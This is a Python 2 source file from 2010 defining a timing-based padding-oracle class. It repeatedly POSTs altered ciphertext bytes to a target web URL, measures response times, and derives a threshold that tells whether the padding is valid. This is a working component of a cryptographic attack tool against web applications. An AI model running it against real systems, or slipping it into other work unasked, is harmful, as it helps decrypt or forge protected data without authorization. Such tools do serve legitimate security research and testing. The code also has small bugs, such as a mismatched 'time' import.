'''
Created on Sep 21, 2010

Copyright (C) 2010 ELOI SANFÈLIX
@author: Eloi Sanfelix < eloi AT limited-entropy.com >

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU Lesser General Public License, version 3,
 as published by the Free Software Foundation.

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with this program.  If not, see <http://www.gnu.org/licenses/>.
'''

from time import *
from urllib import urlencode
from urllib2 import *
import struct
import urllib2

class TimingWebPaddingOracle:
    
    def __init__(self, url , encoder = None, decoder = None, requests=100,headers = {}):
        #Initialize Request with URL and headers
        #self.req = Request(url,headers)
        self.url = url
        self.headers = headers
        self.data = {}
        self.oracle_name = ""
        self.oracle_value = ""
        self.time_threshold = None
        self.requests = requests
        
        if(encoder== None and decoder!=None) or (encoder!=None and decoder==None):
            print "ERROR: Encoder and decoder must be both set or not set at all. Disabling both."
            self.encoder = None
            self.decoder = None
        else:
            self.encoder = encoder
            self.decoder = decoder
        
    def add_variable(self,name,value, oracle=False):
        if(oracle):
            #Data is defined as being vulnerable to oracle attack.
            self.oracle_name = name
            self.oracle_value = value
        else:
            #Add to dictionary with data
            self.data[name] = value
    
    def analyze_normal_request(self):
        
        newdict = self.data.copy()
        newdict[self.oracle_name] = self.oracle_value
        r = urlencode(newdict)
        #r = ""
        #for i in self.data:
        #    r = r + str(i)+"="+urlencode(self.data[i])+"&"
        #r = r + str(self.oracle_name) + "=" + urlencode(self.oracle_value)
        return self.analyze_request(r)
    
    def analyze_request(self,data):
        t = 0
        for i in range(self.requests):
            t += self.perform_request(data)
        return t/self.requests
    
    def perform_request(self,r):
        t = time.time()
        req = Request(self.url,self.headers)
        req.add_data(r)
        f = urllib2.urlopen(req)
        f.read() # Read result from page
        t = time.time() - t
        return t
        
    def test_oracle(self):
        if(self.oracle_name == None or self.oracle_value == None):
            print "ERROR: Cannot test_oracle if no oracle variable defined"
            return
        
        #Perform 'normal' analysis first
        time1 = self.analyze_normal_request()            
        
        #Decode value if needed
        if(self.decoder != None):
            value = self.decoder(self.oracle_value)
        else:
            value = self.oracle_value
        
        oracle_list = [struct.unpack("B", value[i])[0] for i in range(len(value))]
        
        oracle_list[-1] ^= 0xFF #Ensure we always start with a different value

        for b in range(256):
            # XOR current counter. Last byte is now b^0xFF^i = ~b ^ i
            oracle_list[-1] ^=b
            v = "".join([struct.pack("B", i) for i in oracle_list])
            if (self.encoder != None):
                v = self.encoder(v)
            
            newdict = self.data.copy()
            newdict[self.oracle_name] = v
            r = urlencode(newdict)
            
            #And return to original value
            oracle_list[-1] ^=b
            
            time2 = self.analyze_request(r)
            
            #FIXME most likely this will find a difference
            if(time1 != time2):
                print "Found difference for i="+hex(b)
                print "Original timing: " + str(time1)
                print "Bad timing: " + str(time2)
                self.time_threshold = abs(time1 - time2) / 2 + min(time1,time2)
                if(time1 > time2):
                    self.oracle_type = 0x01 #Normal timing is higher than threshold
                else:
                    self.oracle_type = 0x02 #Normal timing is lower than threshold
                return True
        print "ERROR: Could not find a difference."
        return False
    
    def oracle(self,ctext):
        if(self.time_threshold == None):
            print "ERROR: Oracle not defined!"
        else:
            
            newdict = self.data.copy()
            if(self.encoder != None):
                ctext = self.encoder(ctext) #Encode ciphertext before sending request if needed
            newdict[self.oracle_name] = ctext
            
            r = urlencode(newdict)
            t = self.analyze_request(r)
            
            if (self.oracle_type == 0x01 ):
                ret = self.time_threshold < t #Padding is correct if time above threshold
            else:
                ret = self.time_threshold > t #Padding is incorrect if time above threshold
            return ret
        
    def set_threshold(self,threshold):
        self.time_threshold = threshold
    
    def set_type(self,type):
        self.oracle_type = type #0x01 means correct padding takes more time    
    
    def hex_string(self,data):
        return "".join([ hex(ord(i))+" " for i in data])
